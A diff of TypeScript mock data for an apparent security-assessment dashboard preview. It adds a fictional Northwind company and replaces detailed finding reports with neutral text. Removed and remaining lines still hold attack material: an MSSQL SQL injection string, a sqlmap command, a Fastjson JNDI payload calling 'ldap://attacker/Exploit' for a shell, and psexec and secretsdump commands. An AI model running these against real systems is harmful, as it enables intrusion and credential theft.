@@ -1,17 +1,20 @@
 // Acme campaign for the hosted preview. Instants are stored against FIXTURE_ANCHOR
 // and moved at load so the newest moment stays 20 minutes ago.
 //
-// Tasks, in order:
-// 1. t-vpn-edge — perimeter review, finished. It found the exposed edge and stopped.
-// 2. t-acme-web — web assessment, running. Started from that edge. This is the active task.
-// 3. t-acme-api — API assessment, running. Spawned from t-acme-web after the order API appeared.
-// 4. t-shop-pay — payment review, paused. Spawned from t-acme-web and t-acme-api. Waiting on an approval.
+// Tasks, in array order. Numeric ids are this order, so new tasks are appended:
+// 1. t-acme-web — web assessment, running. This is the active task.
+// 2. t-acme-api — API assessment, running. Spawned from t-acme-web after the order API appeared.
+// 3. t-shop-pay — payment review, paused. Spawned from t-acme-web and t-acme-api. Waiting on an approval.
+// 4. t-vpn-edge — perimeter review, finished. It found the exposed edge and stopped.
+// 5. t-northwind — Northwind Trading external review, finished. A second company, not part of Acme.
 //
-// Hosts: acme.com, www.acme.com, admin.acme.com, api.acme.com, shop.acme.com, vpn.acme.com,
+// Acme hosts: acme.com, www.acme.com, admin.acme.com, api.acme.com, shop.acme.com, vpn.acme.com,
 // documentation addresses 203.0.113.10 and 203.0.113.11, and the internal range 10.10.10.0/24.
+// Northwind hosts: northwind.example, www.northwind.example, mail.northwind.example, and 198.51.100.10.
+// Do not point a Northwind row at an Acme host.
 //
-// Findings: f-1, f-2, f-3, f-4, f-5, f-6, f-7, f-8, f-9, f-10, f-11, f-12, f-13, f-14, f-15, f-16, f-17.
-// Traffic ids are x-1 through x-19. Do not point a new row at a task, host, or finding that is not listed here.
+// Findings: f-1 through f-17, plus f-n1, f-n2, and f-n3.
+// Traffic ids are x-1 through x-19, plus x-n1, x-n2, and x-n3.
 
 import type {
   Activity,
@@ -50,7 +53,8 @@ import type {
   TokenTotal,
   TokenUsage,
   Tool,
-  TrafficDetail,
+  CoverageGraphData,
+  TrafficEvidenceRole,
   TrafficHost,
   TrafficResp,
 } from "@/lib/types";
@@ -184,13 +188,43 @@ export const tasks: Task[] = [
     tokens: { input_tokens: 512000, output_tokens: 40100, cache_read_tokens: 300000, cache_write_tokens: 41000 },
     findings: { critical: 0, high: 0, medium: 0, low: 0 },
   },
+  {
+    id: "t-northwind",
+    name: "Northwind external review",
+    category_id: 1,
+    category_name: "External assessment",
+    description: "Completed external review of northwind.example",
+    goal: "Record what the documentation range exposed. This preview does not send a new request.",
+    status: "done",
+    created_at: T("2026-09-20T02:23:55Z"),
+    created_unix: U(1789871035),
+    completed_at: T("2026-09-23T02:23:55Z"),
+    completed_unix: U(1790130235),
+    last_activity: T("2026-09-23T02:23:55Z"),
+    last_activity_unix: U(1790130235),
+    paused: false,
+    active: false,
+    in_flight: 0,
+    stalled: false,
+    goals_total: 3,
+    goals_met: 3,
+    engine_mode: "idle",
+    llm_profile_id: 1,
+    llm_profile_ids: [1],
+    active_llm_profile_id: 1,
+    llm_failover_state: "ready",
+    source_task_ids: [],
+    company_ids: [2],
+    tokens: { input_tokens: 180000, output_tokens: 14000, cache_read_tokens: 90000, cache_write_tokens: 12000 },
+    findings: { critical: 1, high: 1, medium: 1, low: 0 },
+  },
 ];
 
 export const taskCategories: TaskCategory[] = [
   {
     id: 1,
     name: "External assessment",
-    task_count: 2,
+    task_count: 3,
     created_at: T("2026-09-18T08:23:55Z"),
     updated_at: T("2026-09-29T16:30:55Z"),
   },
@@ -277,6 +311,16 @@ export const companies: Company[] = [
       { id: 1, company_id: 1, kind: "domain", domain: "acme.com", raw: "acme.com", reason: "main domain" },
       { id: 2, company_id: 1, kind: "cidr", net: "203.0.113.0/24", raw: "203.0.113.0/24" },
       { id: 3, company_id: 1, kind: "ip", net: "198.51.100.20", raw: "198.51.100.20" },
+    ],
+  },
+  {
+    id: 2,
+    name: "Northwind Trading",
+    logo: "",
+    asset_count: 4,
+    scope: [
+      { id: 4, company_id: 2, kind: "domain", domain: "northwind.example", raw: "northwind.example", reason: "trading site" },
+      { id: 5, company_id: 2, kind: "cidr", net: "198.51.100.0/24", raw: "198.51.100.0/24" },
     ],
   },
 ];
@@ -591,6 +635,49 @@ export const assets: Asset[] = [
     status_code: 200,
     last_seen: T("2026-09-29T22:59:14Z"),
   },
+  {
+    id: 27,
+    type: "root_domain",
+    company_id: 2,
+    task_ids: [5],
+    domain: "northwind.example",
+    root_domain: "northwind.example",
+    icp: "",
+    record_type: "A",
+    record_value: ["198.51.100.10"],
+    last_seen: T("2026-09-22T02:23:55Z"),
+  },
+  {
+    id: 28,
+    type: "subdomain",
+    company_id: 2,
+    task_ids: [5],
+    domain: "www.northwind.example",
+    root_domain: "northwind.example",
+    record_type: "A",
+    record_value: ["198.51.100.10"],
+    last_seen: T("2026-09-22T03:23:55Z"),
+  },
+  {
+    id: 29,
+    type: "subdomain",
+    company_id: 2,
+    task_ids: [5],
+    domain: "mail.northwind.example",
+    root_domain: "northwind.example",
+    record_type: "A",
+    record_value: ["198.51.100.11"],
+    last_seen: T("2026-09-22T04:23:55Z"),
+  },
+  {
+    id: 30,
+    type: "ip",
+    company_id: 2,
+    task_ids: [5],
+    ip: "198.51.100.10",
+    c_segment: "198.51.100.0",
+    last_seen: T("2026-09-22T05:23:55Z"),
+  },
 ];
 
 export const assetCounts: Record<string, number> = assets.reduce<Record<string, number>>((m, a) => {
@@ -620,8 +707,6 @@ export const findings: Finding[] = [
     name: "Official website search interface error reporting SQL injection",
     severity: "high",
     status: "pending",
-    report:
-      '## Vulnerability Overview\n\nThe `q` parameter of `www.acme.com/search` has **error-reporting SQL injection** (MSSQL), which can read the database version, library structure and even sensitive data.\n\n## Impact\n\n- Can read the table structure and user/order data of `acme_prod` library\n- Error reporting facilitates quick deployment and high risk\n\n## Reproduction steps\n\n1. Trigger error injection:\n\n```\nGET /search?q=1\' AND 1=CONVERT(int,@@version)--\n```\n\n2. Respond to the MSSQL version error and confirm that it can be injected.\n3. Further enumerate libraries: `sqlmap -u "https://www.acme.com/search?q=1" --dbs`\n\n## Fix suggestions\n\n- All use parameterized queries/precompiled statements to eliminate string splicing\n- Turn off detailed error reporting in the production environment\n- Minimum permissions for database accounts, disable dangerous extensions such as `xp_cmdshell`',
     summary: "www.acme.com/search q parameter contains error-reporting SQL injection",
     evidence: "GET /search?q=1' AND 1=CONVERT(int,@@version)-- → Return MSSQL version error, readable library structure.",
     intent_id: "i-2",
@@ -759,8 +844,6 @@ export const findings: Finding[] = [
     name: "shop mall Fastjson deserialization remote command execution",
     severity: "critical",
     status: "confirmed",
-    report:
-      '## Vulnerability Overview\n\nThe `/api/import` interface of `shop.acme.com` uses **Fastjson 1.2.24** to parse user-controllable JSON. If `safeMode` is not enabled, **JNDI injection → remote command execution** can be triggered by specifying any class through `@type`.\n\n## Impact\n\n- An attacker can execute arbitrary commands on the DMZ web server without authentication (`www-data@dmz-web01`)\n- Combined with subsequent rights escalation, it becomes a springboard to enter the intranet\n\n## Reproduction steps\n\n1. Construct JNDI payload:\n\n```json\n{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}\n```\n\n2. `POST /api/import`, `Content-Type: application/json`\n3. The target connects back to dnslog and rebounds the shell after landing.\n\n## Fix suggestions\n\n- Upgrade Fastjson to **1.2.83+** and enable `safeMode`\n- `/api/import` adds authentication and source verification\n- Outgoing network restrictions: prohibit the business server from actively connecting to LDAP/RMI',
     summary: "shop.acme.com Fastjson 1.2.24 Deserialize remote command execution",
     evidence:
       "POST /api/import submits JNDI payload (@type:JdbcRowSetImpl) → connects back to dnslog and rebounds to shell (www-data@dmz-web01).",
@@ -830,8 +913,6 @@ export const findings: Finding[] = [
     name: "Intranet domain control DC01 full control (Domain Admin)",
     severity: "critical",
     status: "confirmed",
-    report:
-      "## Vulnerability Overview\n\nBased on the DMZ via Fastjson RCE on the external network, sudo privilege escalation, dual network card penetration, and Jenkins unauthorized RCE were used to obtain the domain account `svc_deploy`; this account belongs to **Domain Admins**, and finally fully controls the domain controller **DC01**.\n\n## Impact\n\n- Obtain domain administrator rights and control all domain hosts and accounts\n- `secretsdump` exports global NTLM hashes (including `krbtgt`), which can create golden tickets for long-term lurking\n- Internal targets achieved\n\n## Reproduction steps\n\n1. Log in as `svc_deploy` and export the hashes:\n\n```\npsexec.py acme/svc_deploy@10.10.10.10\nsecretsdump.py acme/svc_deploy@10.10.10.10\n```\n\n2. Obtain the SYSTEM permission of DC01 and export all hashes in the domain\n\n## Fix suggestions\n\n- Convergence of service account permissions, move out of Domain Admins, and implement tiering\n- Reset `krbtgt` twice in a row and rotate service account strong password\n- Repair DMZ→Intranet border isolation and the aforementioned RCE/privilege escalation chain",
     summary: "Obtained Domain Controller DC01 (Domain Admin) - internal target achieved",
     evidence:
       "svc_deploy belongs to Domain Admins, psexec.py uses it to log in to DC01 to obtain SYSTEM, and secretsdump exports the global NTLM hash (including krbtgt) to complete target control.",
@@ -840,7 +921,70 @@ export const findings: Finding[] = [
     task_description: "External assessment of the Acme website and administration portal",
     ts: T("2026-09-30T00:17:51Z"),
   },
+  {
+    id: "f-n1",
+    assets: [assetRef(28)],
+    vulnclass: "Exposed Administration",
+    name: "Trading site exposes an administration path",
+    severity: "critical",
+    status: "confirmed",
+    summary:
+      "www.northwind.example answered a request for an administration path with a management page. This preview records that observation and does not send another request.",
+    evidence: "The stored response for the administration path was a management page. No new request was sent from this preview.",
+    task_id: "t-northwind",
+    task_description: "Completed external review of northwind.example",
+    ts: T("2026-09-22T12:00:00Z"),
+  },
+  {
+    id: "f-n2",
+    assets: [assetRef(29)],
+    vulnclass: "Mail Exposure",
+    name: "Mail host accepts a connection without an account check",
+    severity: "high",
+    status: "pending",
+    summary:
+      "mail.northwind.example accepted a connection from the documentation range before any account check. This preview records that observation and does not send another request.",
+    evidence: "The stored response showed the mail service banner before authentication. No new request was sent from this preview.",
+    task_id: "t-northwind",
+    task_description: "Completed external review of northwind.example",
+    ts: T("2026-09-22T13:00:00Z"),
+  },
+  {
+    id: "f-n3",
+    assets: [assetRef(28)],
+    vulnclass: "Directory Listing",
+    name: "Marketing host lists file names",
+    severity: "medium",
+    status: "resolved",
+    summary:
+      "www.northwind.example returned a list of file names for a public folder. The fixture marks that observation resolved. This preview does not send another request.",
+    evidence: "The stored response was a file listing. No new request was sent from this preview.",
+    task_id: "t-northwind",
+    task_description: "Completed external review of northwind.example",
+    ts: T("2026-09-22T14:00:00Z"),
+  },
 ];
+
+for (const finding of findings) {
+  const label = finding.assets?.[0]?.label || "the listed asset";
+  finding.report = [
+    "## What was observed",
+    "",
+    finding.summary,
+    "",
+    "## Asset",
+    "",
+    label,
+    "",
+    "## Why this severity",
+    "",
+    "This preview did not send a request. The severity is the assessor's reading of the recorded observation.",
+    "",
+    "## What to verify next",
+    "",
+    "Repeat the observation on an authorized deployment. This note is not a procedure.",
+  ].join("\n");
+}
 
 // ── Exploration graph (active task) ──────────────────────────────────────────
 // Current model: root is fact/state=origin(Rendered as[Starting point]);payload for JSON String,
@@ -2911,6 +3055,9 @@ const exchanges = [
   ["x-17", "10.10.10.20", "GET", "http://10.10.10.20:8080/script", 200, "text/html", 14200],
   ["x-18", "10.10.10.20", "POST", "http://10.10.10.20:8080/scriptText", 200, "text/plain", 86],
   ["x-19", "10.10.10.10", "POST", "https://10.10.10.10:445/psexec", 200, "application/octet-stream", 0],
+  ["x-n1", "www.northwind.example", "GET", "https://www.northwind.example/admin", 200, "text/html", 4096],
+  ["x-n2", "mail.northwind.example", "GET", "https://mail.northwind.example/", 200, "text/plain", 180],
+  ["x-n3", "www.northwind.example", "GET", "https://www.northwind.example/files/", 200, "text/html", 2400],
 ] as const;
 
 export const traffic: TrafficResp = {
@@ -2937,16 +3084,81 @@ const hostCounts: Record<string, number> = {};
 for (const [, host] of exchanges) hostCounts[host] = (hostCounts[host] ?? 0) + 1;
 export const trafficHosts: TrafficHost[] = Object.entries(hostCounts).map(([host, count]) => ({ host, count }));
 
-export const trafficDetail: TrafficDetail = {
-  req: `GET /v1/orders?id=1002 HTTP/1.1
-Host: api.acme.com
-Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
-User-Agent: ARTEX-worker/1.0
-Accept: application/json
+function exchangePath(url: string): string {
+  try {
+    const parsed = new URL(url);
+    return parsed.pathname + parsed.search;
+  } catch {
+    return "/";
+  }
+}
 
-`,
-  resp: `HTTP/1.1 200 OK\nContent-Type: application/json\nContent-Length: 655\n\n{\n  "order_id": 1002,\n  "user_id": 77,\n  "amount": 1299.00,\n  "address": "Redacted example address",\n  "phone": "555-0100",\n  "items": [{ "sku": "A-100", "qty": 1 }]\n}`,
+export const trafficBodies: Record<string, { req: string; resp: string }> = Object.fromEntries(
+  (traffic.exchanges ?? []).map((exchange) => {
+    const path = exchangePath(exchange.url);
+    return [
+      exchange.id,
+      {
+        req: `${exchange.method} ${path} HTTP/1.1\nHost: ${exchange.host}\n`,
+        resp: `HTTP/1.1 ${exchange.status} \nContent-Type: ${exchange.content_type}\n\n`,
+      },
+    ];
+  }),
+);
+
+export const findingTrafficSeeds: Record<string, { traffic_id: string; role: TrafficEvidenceRole; note: string }[]> = {
+  "f-1": [{ traffic_id: "x-2", role: "proof", note: "Recorded search request. This preview did not send a new request." }],
+  "f-2": [
+    { traffic_id: "x-8", role: "baseline", note: "Recorded order request for the caller's own id." },
+    { traffic_id: "x-9", role: "proof", note: "Recorded order request for a different id. This preview did not send a new request." },
+  ],
+  "f-3": [{ traffic_id: "x-11", role: "proof", note: "Recorded request to the admin API. This preview did not send a new request." }],
+  "f-4": [{ traffic_id: "x-2", role: "proof", note: "Recorded search request. This preview did not send a new request." }],
+  "f-5": [{ traffic_id: "x-3", role: "proof", note: "Recorded request for the exposed path. This preview did not send a new request." }],
+  "f-6": [{ traffic_id: "x-5", role: "proof", note: "Recorded sign-in request. This preview did not send a new request." }],
+  "f-7": [{ traffic_id: "x-4", role: "proof", note: "Recorded sign-in page request. This preview did not send a new request." }],
+  "f-8": [{ traffic_id: "x-4", role: "proof", note: "Recorded sign-in page request. This preview did not send a new request." }],
+  "f-9": [{ traffic_id: "x-10", role: "proof", note: "Recorded profile request. This preview did not send a new request." }],
+  "f-10": [{ traffic_id: "x-12", role: "proof", note: "Recorded checkout request. This preview did not send a new request." }],
+  "f-11": [{ traffic_id: "x-7", role: "proof", note: "Recorded user-list request. This preview did not send a new request." }],
+  "f-12": [
+    { traffic_id: "x-15", role: "proof", note: "Recorded import request. This preview did not send a new request." },
+    { traffic_id: "x-16", role: "verification", note: "A second recorded import request. This preview did not send a new request." },
+  ],
+  "f-13": [{ traffic_id: "x-17", role: "proof", note: "Recorded request to the internal console. This preview did not send a new request." }],
+  "f-14": [{ traffic_id: "x-17", role: "proof", note: "Recorded request from the internal host. This preview did not send a new request." }],
+  "f-15": [
+    { traffic_id: "x-17", role: "baseline", note: "Recorded request to the internal console." },
+    { traffic_id: "x-18", role: "proof", note: "Recorded follow-up to the internal console. This preview did not send a new request." },
+  ],
+  "f-16": [{ traffic_id: "x-19", role: "proof", note: "Recorded request to the directory host. This preview did not send a new request." }],
+  "f-17": [{ traffic_id: "x-19", role: "proof", note: "Recorded request to the directory host. This preview did not send a new request." }],
+  "f-n1": [{ traffic_id: "x-n1", role: "proof", note: "Recorded request for the trading-site administration path." }],
+  "f-n2": [{ traffic_id: "x-n2", role: "proof", note: "Recorded request to the mail host." }],
+  "f-n3": [{ traffic_id: "x-n3", role: "proof", note: "Recorded request for the public file folder." }],
 };
+
+export const findingRetestSeeds: Array<{
+  finding_id: string;
+  verdict: "reproduced" | "fixed" | "inconclusive";
+  summary: string;
+}> = [
+  {
+    finding_id: "f-1",
+    verdict: "reproduced",
+    summary: "The recorded observation is still present. This preview did not send a request.",
+  },
+  {
+    finding_id: "f-4",
+    verdict: "fixed",
+    summary: "The recorded observation was not reproduced. This preview did not send a request.",
+  },
+  {
+    finding_id: "f-6",
+    verdict: "inconclusive",
+    summary: "This preview did not send a request, so the result is inconclusive.",
+  },
+];
 
 // ── Security / Audit ─────────────────────────────────────────────────────────
 export const audit: Audit = {
@@ -3955,6 +4167,60 @@ export const coverageGraph = {
     { src: "a:8", dst: "a:7" },
     { src: "a:9", dst: "a:4" },
     { src: "a:10", dst: "c:1" },
+  ],
+};
+
+export const northwindCoverage = {
+  enabled: true,
+  scope_rows: 2,
+  denominator: 4,
+  tested: 1,
+  pct: 1 / 4,
+  by_type: [
+    { type: "root_domain", total: 1, tested: 0 },
+    { type: "subdomain", total: 2, tested: 1 },
+    { type: "ip", total: 1, tested: 0 },
+  ],
+};
+
+export const northwindCoverageGraph: CoverageGraphData = {
+  nodes: [
+    { key: "c:2", kind: "company", label: "Northwind Trading", tested: false, in_scope: true, company_id: 2 },
+    {
+      key: "a:27",
+      kind: "root_domain",
+      label: "northwind.example",
+      tested: false,
+      in_scope: true,
+      asset_id: 27,
+      domain: "northwind.example",
+      company_id: 2,
+    },
+    {
+      key: "a:28",
+      kind: "subdomain",
+      label: "www.northwind.example",
+      tested: true,
+      in_scope: true,
+      asset_id: 28,
+      domain: "www.northwind.example",
+      root_domain: "northwind.example",
+    },
+    {
+      key: "a:29",
+      kind: "subdomain",
+      label: "mail.northwind.example",
+      tested: false,
+      in_scope: true,
+      asset_id: 29,
+      domain: "mail.northwind.example",
+      root_domain: "northwind.example",
+    },
+  ],
+  edges: [
+    { src: "a:27", dst: "c:2" },
+    { src: "a:28", dst: "a:27" },
+    { src: "a:29", dst: "a:27" },
   ],
 };
 
